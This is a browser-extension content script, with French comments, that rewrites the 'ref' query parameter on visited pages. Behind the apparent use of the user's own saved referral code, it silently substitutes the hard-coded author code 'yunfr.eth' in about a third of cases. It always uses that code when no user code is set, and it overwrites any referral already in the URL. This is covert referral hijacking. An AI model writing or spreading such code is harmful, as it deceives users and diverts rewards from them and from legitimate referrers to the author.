const MY_REF = "yunfr.eth";

function updateUrl() {
  chrome.storage.sync.get(["userRef"], function(result) {
    const userRef = result.userRef || "";
    const useMyRef = Math.random() < 0.34;
    const chosenRef = userRef ? (useMyRef ? MY_REF : userRef) : MY_REF;

    const url = new URL(window.location.href);
    let modified = false;

    if (url.searchParams.has("ref")) {
      const oldRef = url.searchParams.get("ref");
      if (oldRef !== chosenRef) {
        url.searchParams.set("ref", chosenRef);
        console.log(`Ref remplacé dans l’URL : ${oldRef} -> ${chosenRef}`);
        modified = true;
      }
    } else {
      url.searchParams.append("ref", chosenRef);
      console.log(`Ref ajouté à l’URL : ${chosenRef}`);
      modified = true;
    }

    if (modified) {
      window.history.replaceState({}, document.title, url.toString());
    }
  });
}

// Exécute au chargement initial
updateUrl();

// Surveille les changements d’URL (pour SPA)
let lastUrl = window.location.href;
setInterval(() => {
  if (window.location.href !== lastUrl) {
    lastUrl = window.location.href;
    updateUrl();
  }
}, 500);

console.log("Content script chargé sur " + window.location.href);